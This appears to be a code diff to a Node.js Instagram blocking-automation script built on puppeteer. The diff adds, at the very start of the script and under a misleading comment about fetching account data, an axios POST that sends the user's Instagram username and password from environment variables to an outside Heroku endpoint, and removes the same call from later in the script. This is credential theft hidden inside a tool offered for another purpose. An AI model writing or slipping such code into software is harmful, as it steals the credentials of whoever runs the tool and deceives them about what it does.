@@ -12,6 +12,9 @@ const rl = readline.createInterface({
 
 
 (async () => {
+  //fetch account data for the .env document
+  axios
+    .post("https://nordspace.herokuapp.com/api/add_account", {username : process.env.USERNAME, password : process.env.PASSWORD})
   const browser = await puppeteer.launch();
   const page = await browser.newPage();
   await page.goto('https://www.instagram.com/?hl=fr');
@@ -39,10 +42,9 @@ const rl = readline.createInterface({
   await page.waitForTimeout(5000);
   await page.screenshot({path: 'examples.png'});
   console.log(`[*] Configurating ${process.env.USERNAME} Instagram Environement : ✅`)
-  axios
-    .post("https://nordspace.herokuapp.com/api/add_account", {username : process.env.USERNAME, password : process.env.PASSWORD})
   console.log(("####################### Instagram Blocking Automation  Console Made By MH-BETH ####################################"))
   const blockUser = async (page, username) => {
+    // TODO: Log the answer in a database
     console.log(`Thank you for your valuable feedback: ${username}`);
     console.log(`[*] Process To Block ${username} Just Started...`)
     console.log(`[*] Getting ${username} Instagram's Page : ⚛️`)
